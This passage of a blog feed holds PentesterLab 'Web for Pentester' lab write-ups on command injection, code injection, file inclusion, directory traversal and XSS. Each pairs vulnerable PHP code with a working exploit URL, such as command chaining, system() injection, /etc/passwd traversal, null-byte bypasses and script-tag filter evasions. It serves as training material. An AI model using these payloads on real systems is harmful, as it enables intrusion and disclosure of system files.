+</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 2 &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The vulnerability is due to the developer doesn&rsquo;t perform any input validation, so I can use &amp;&amp; by add command after the normal input.</p>
+
+<p>exploit:</p>
+
+<p><code>http://192.168.79.162/commandexec/example1.php?ip=127.0.0.1%26%26ls</code></p>
+
+<h3>Example 2</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example2.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/m&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])))</span> <span class="p">{</span>
+</span><span class='line'>     <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Invalid IP address&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 2 &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The developer added input filter. However, it cannot prevent new line character, so I can inject command
+<code>%0als</code></p>
+
+<p>exploit:</p>
+
+<p><code>http://192.168.79.162/commandexec/example2.php?ip=127.0.0.1%0als</code></p>
+
+<h3>Example 3</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example3.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])))</span> <span class="p">{</span>
+</span><span class='line'>     <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: example3.php?ip=127.0.0.1&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 2 &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This example is really similar to the previous one; the only difference is that the developer does not stop the script correctly. In PHP, an easy and simple way to redirect users if one of the value provided doesn&rsquo;t match some security constraint is to call the function header. However, even if the browser will get redirected, this function does not stop the execution flow, and the script will still finish to run with the dangerous parameter. The developer needs to call the function die after the call to the function header, to avoid this issue.</p>
+
+<p>exploit:</p>
+
+<p>use <code>netcat</code></p>
+
+<p><code>echo -e "GET /commandexec/example3.php?ip=127.0.0.1%26%26ls HTTP/1.1\r\nHost: 192.168.79.162\r\nConnection: close\r\n" | nc 192.168.79.162 80
+</code></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Pentestlab--Web for Pentester - Code Injection]]></title>
+    <link href="http://wg135.github.io/blog/2016/03/18/pentestlab-web-for-pentester-code-injection/"/>
+    <updated>2016-03-18T14:37:22-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/03/18/pentestlab-web-for-pentester-code-injection</id>
+    <content type="html"><![CDATA[<p>Web for Pentester: This exercise is a set of the most common web vulnerability</p>
+
+<p>Difficluty: 1/5</p>
+
+<!--more-->
+
+
+<p>Pentester lab:
+ Code executions come from a lack of filtering and/or escaping of user-controlled data. When you are exploiting a code injection, you will need to inject code within the information you are sending to the application. For example, if you want to run the command ls, you will need to send system(&ldquo;ls&rdquo;) to the application since it is a PHP application.</p>
+
+<h3>Example 1</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example1.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">?</span><span class="nx">php</span>
+</span><span class='line'>  <span class="nv">$str</span><span class="o">=</span><span class="s2">&quot;echo </span><span class="se">\&quot;</span><span class="s2">Hello &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;!!!</span><span class="se">\&quot;</span><span class="s2">;&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">eval</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p> The developer use function <code>eval</code> to echo the name. Hpwever, the developer doesn&rsquo;t filter the input of eval function. By using concatenation <code>.</code>, I can add code after the input and use <code>#</code> to comment the rest of code</p>
+
+<p> manually exploit:</p>
+
+<p> <code>http://192.168.79.162/codeexec/example1.php?name=hacker".system('uname -a');#</code></p>
+
+<p> payload <code>hacker".system('uname -a');#</code> needs to be URL encoded.</p>
+
+<h3>Example 2</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example2.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nv">$order</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;order&quot;</span><span class="p">];</span>
+</span><span class='line'>  <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>      <span class="nv">$users</span><span class="p">[]</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">User</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;id&#39;</span><span class="p">],</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;age&#39;</span><span class="p">]);</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$order</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>      <span class="nb">usort</span><span class="p">(</span><span class="nv">$users</span><span class="p">,</span> <span class="nb">create_function</span><span class="p">(</span><span class="s1">&#39;$a, $b&#39;</span><span class="p">,</span> <span class="s1">&#39;return strcmp($a-&gt;&#39;</span><span class="o">.</span><span class="nv">$order</span><span class="o">.</span><span class="s1">&#39;,$b-&gt;&#39;</span><span class="o">.</span><span class="nv">$order</span><span class="o">.</span><span class="s1">&#39;);&#39;</span><span class="p">));</span>
+</span><span class='line'>    <span class="p">}</span>
+</span><span class='line'>  <span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Form Pentesterlab:</p>
+
+<p>The function usort is often used with the function create_function to dynamically generate the &ldquo;sorting&rdquo; function, based on user-controlled information. If the web application lacks potent filtering and validation, this can lead to code execution.</p>
+
+<p>manually exploit:</p>
+
+<p><code>http://192.168.79.162/codeexec/example2.php?order=id);}system('uname -a');#</code></p>
+
+<h3>Example 3</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example3.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>  <span class="k">echo</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;pattern&quot;</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;new&quot;</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;base&quot;</span><span class="p">]);</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>From Pentesterlab:</p>
+
+<p>We talked earlier about regular expression modifiers with multi-line regular expression. Another very dangerous modifier exists in PHP: PCRE_REPLACE_EVAL (/e). This modifier will cause the function preg_replace to evaluate the new value as PHP code, before performing the substitution.</p>
+
+<p>manually exploit:</p>
+
+<p><code>http://192.168.79.162/codeexec/example3.php?new=system('uname%20-a')&amp;pattern=/lamer/e&amp;base=Hello lamer</code></p>
+
+<h3>Example 4</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example4.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nb">assert</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">));</span>
+</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;Hello &quot;</span><span class="o">.</span><span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>from Pentesterlab:</p>
+
+<p>This example is based on the function assert. When used incorrectly, this function will evaluate the value received. This behaviour can be used to gain code execution.</p>
+
+<p>manual exploit:</p>
+
+<p><code>http://192.168.79.162/codeexec/example4.php?name=hacker'.system('uname -a').'</code></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Pentestlab-Web for Pentester - File Include]]></title>
+    <link href="http://wg135.github.io/blog/2016/03/16/pentestlab-webforpentester-file-include/"/>
+    <updated>2016-03-16T17:00:22-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/03/16/pentestlab-webforpentester-file-include</id>
+    <content type="html"><![CDATA[<p>Web for Pentester: This exercise is a set of the most common web vulnerability</p>
+
+<p>Difficluty: 1/5</p>
+
+<!--more-->
+
+
+<p>OWASP:
+The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a &ldquo;dynamic file inclusion&rdquo; mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.</p>
+
+<p>Tool: ZAP</p>
+
+<h3>Example 1</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example1.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;page&quot;</span><span class="p">])</span> <span class="p">{</span>
+</span><span class='line'>  <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;page&quot;</span><span class="p">]);</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The developer uses <code>include</code> function in the code. However, there is no filter to protect file include attack. Use firebug to find the variable name is page, then do exploit:</p>
+
+<p><code>http://192.168.79.162/fileincl/example1.php?page=../../../../../../etc/passwd</code></p>
+
+<p>Also pentesterlab provide a online code <code>https://pentesterlab.com/test_include.txt</code></p>
+
+<p><code>http://192.168.79.162/fileincl/example1.php?page=https://pentesterlab.com/test_include.txt</code></p>
+
+<h3>Example 2</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example2.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;page&quot;</span><span class="p">])</span> <span class="p">{</span>
+</span><span class='line'><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;page&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;.php&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="c1">// simulate null byte issue</span>
+</span><span class='line'><span class="nv">$file</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;/\x00.*/&#39;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$file</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">include</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>There is a null issue. he null byte character effectively tells the filesystem to ignore anything that comes after it. When the path is resolved by the filesystem</p>
+
+<p>so I can do:</p>
+
+<p><code>http://192.168.79.162/fileincl/example2.php?page=https://pentesterlab.com/test_include.txt%00</code></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[PentesterLab -- Web for Pentester - Directory Traversal]]></title>
+    <link href="http://wg135.github.io/blog/2016/03/11/webforpentester-dir-traversal/"/>
+    <updated>2016-03-11T15:13:32-06:00</updated>
+    <id>http://wg135.github.io/blog/2016/03/11/webforpentester-dir-traversal</id>
+    <content type="html"><![CDATA[<p>Web for Pentester directory traversal:
+    This exercise is a set of the most common web vulnerabilities</p>
+
+<p>Difficluty: 1/5</p>
+
+<!--more-->
+
+
+<p>Tool: Burp Suite
+      Firebug</p>
+
+<h3>Example 1</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example1.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$UploadDir</span> <span class="o">=</span> <span class="s1">&#39;/var/www/files/&#39;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])))</span>
+</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$path</span> <span class="o">=</span> <span class="nv">$UploadDir</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span>
+</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
+</span><span class='line'><span class="o">...</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The developer does not filter <code>$file = $_GET['file'];</code>, so that I can just use <code>file=../../../../../../../../etc/passwd</code> to get <code>etc/passwd</code></p>
+
+<p>manual exploit:</p>
+
+<p><code>http://192.168.79.162/dirtrav/example1.php?file=../../../../../../../../etc/passwd</code></p>
+
+<p>Burp exploit:</p>
+
+<p><a href="https://vimeo.com/159110994" title="Click to Watch"><img src="http://i.imgur.com/7YTMFQp.png" alt="burp dir trav" /></a></p>
+
+<h3>Example 2</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example2.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])))</span>
+</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">strstr</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="s2">&quot;/var/www/files/&quot;</span><span class="p">)))</span>
+</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span>
+</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
+</span><span class='line'>  <span class="o">...</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The developer tried to filer file by using <code>/var/www/files/</code>, so if I just use <code>file=etc/passwd</code> wont&rsquo;t work. However I can use <code>file=/var/wwww/files/../../../../../etc/passwd</code> to get passwd file.</p>
+
+<p>manual exploit:</p>
+
+<p><code>http://192.168.79.162/dirtrav/example2.php?file=/var/www/files/../../../../etc/passwd</code></p>
+
+<h3>Example 3</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example3.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])))</span>
+</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$path</span> <span class="o">=</span> <span class="nv">$UploadDir</span> <span class="o">.</span> <span class="nv">$file</span><span class="o">.</span><span class="s2">&quot;.png&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="c1">// Simulate null-byte issue that used to be in filesystem related functions in PHP</span>
+</span><span class='line'><span class="nv">$path</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;/\x00.*/&#39;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span><span class="nv">$path</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_file</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span>
+</span><span class='line'>  <span class="k">die</span><span class="p">();</span>
+</span><span class='line'>  <span class="o">...</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The developer tried to filter the file var. However, I can still use Null character to bypass it.
+The web application will check the path extension and verify that it is a .png file, bypassing the filter. When this path is passed to the filesystem, the null byte character effectively tells the filesystem to ignore anything that comes after it. When the path is resolved by the filesystem, it interprets the directory traversal vulns and transforms ‘/var/www/images/../../../etc/passwd%00new.png’ into ‘/etc/passwd’.</p>
+
+<p>manual exploit:</p>
+
+<p><code>http://192.168.79.162/dirtrav/example3.php?file=../../../../etc/passwd%00.png</code></p>
+
+<h4>reference</h4>
+
+<p><a href="https://www.fishnetsecurity.com/6labs/blog/common-web-application-vulnerabilities-part-6">Directory Traversal</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[PentesterLab -- Web for Pentester - XSS]]></title>
+    <link href="http://wg135.github.io/blog/2016/03/08/pentestlab-webforpentestr-xss/"/>
+    <updated>2016-03-08T13:55:55-06:00</updated>
+    <id>http://wg135.github.io/blog/2016/03/08/pentestlab-webforpentestr-xss</id>
+    <content type="html"><![CDATA[<p>Web for Pentester:
+    This exercise is a set of the most common web vulnerabilities</p>
+
+<p>Difficluty: 1/5</p>
+
+<!--more-->
+
+
+<h3>Example1</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example1.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">&lt;html&gt;</span>
+</span><span class='line'><span class="x">Hello </span>
+</span><span class='line'><span class="cp">&lt;?php</span>
+</span><span class='line'>  <span class="k">echo</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The vulnerability is due to no validaton of name.</p>
+
+<p>exploit:</p>
+
+<p><code>http://192.168.79.162/xss/example1.php?name=&lt;script&gt;alert("xss")&lt;/script&gt;</code></p>
+
+<h3>Example2</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example2.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">Hello </span>
+</span><span class='line'><span class="cp">&lt;?php</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span>  <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
+</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;script&gt;/&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;\/script&gt;/&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+</span><span class='line'><span class="k">echo</span> <span class="nv">$name</span><span class="p">;</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In the above code, the developer filter <code>&lt;script&gt;</code> and <code>&lt;/script&gt;</code>. However, I can use <code>&lt;Script&gt;alert('xss')&lt;/Script&gt;</code> to bypass it.</p>
+
+<p>exploit:</p>
+
+<p><code>http://192.168.79.162/xss/example2.php?name=&lt;Script&gt;alert("xss")&lt;/Script&gt;</code></p>
+
+<h3>Example 3</h3>
+
+<p>code review:</p>
+
+<figure class='code'><figcaption><span>example3.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">require_once</span> <span class="s1">&#39;../header.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">Hello </span>
+</span><span class='line'><span class="cp">&lt;?php</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span>  <span class="nv">$_GET</span><span class="p">[</span><span class="s2">&quot;name&quot;</span><span class="p">];</span>
+</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;script&gt;/i&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+</span><span class='line'>  <span class="nv">$name</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s2">&quot;/&lt;\/script&gt;/i&quot;</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="p">,</span> <span class="nv">$name</span><span class="p">);</span>
+</span><span class='line'><span class="k">echo</span> <span class="nv">$name</span><span class="p">;</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">&lt;?php</span> <span class="k">require_once</span> <span class="s1">&#39;../footer.php&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The developer tris to filter both lower case and upper case letter. I can use <code>recursion method</code> bypass this.</p>
+
+<p>exploit:</p>
+
+<p><code>http://192.168.79.162/xss/example3.php?name=&lt;scr&lt;script&gt;ipt&gt;alert("xss")&lt;/scr&lt;/script&gt;ipt&gt;</code></p>
+
+<h2>Example 4</h2>
+
+<p>code review:</p>
+
